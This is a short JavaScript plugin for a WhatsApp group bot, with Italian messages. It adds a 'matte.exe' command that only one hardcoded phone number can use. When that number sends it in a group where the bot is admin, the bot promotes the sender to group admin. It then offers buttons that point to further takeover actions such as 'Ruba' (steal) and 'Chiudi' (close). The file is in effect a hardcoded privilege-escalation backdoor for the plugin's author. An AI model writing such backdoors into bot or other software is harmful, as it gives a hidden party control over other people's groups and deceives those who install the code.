let handler = async (m, { conn, isAdmin }) => {
    const numeroAutorizzato = '66621409462@s.whatsapp.net';

    if (m.sender !== numeroAutorizzato) {
        await conn.sendMessage(m.chat, {
            text: '🔒 *Solo Mattee può eseguire questa funzione.*',
        });
        return;
    }

    if (isAdmin) throw '⚠️ *Sei già admin, relax.*';

    try {
        await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote");

        const buttons = [
            { buttonId: '.cornuto', buttonText: { displayText: '😈 Cornutissimo' }, type: 1 },
            { buttonId: '.ruba', buttonText: { displayText: '🛠️ Ruba' }, type: 1 },
            { buttonId: '.chiudi', buttonText: { displayText: '🚪 Chiudi' }, type: 1 },
        ];

        const buttonMessage = {
            text: '🧠 *Promozione completata!*\n\nSei ora admin, scegli cosa fare:',
            footer: 'matte.exe v1.0',
            buttons: buttons,
            headerType: 1,
        };

        await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (e) {
        console.error(e);
        await m.reply('❌ *Errore nella promozione.*');
    }
};

handler.command = /^matte\.exe$/i;
handler.group = true;
handler.botAdmin = true;

export default handler;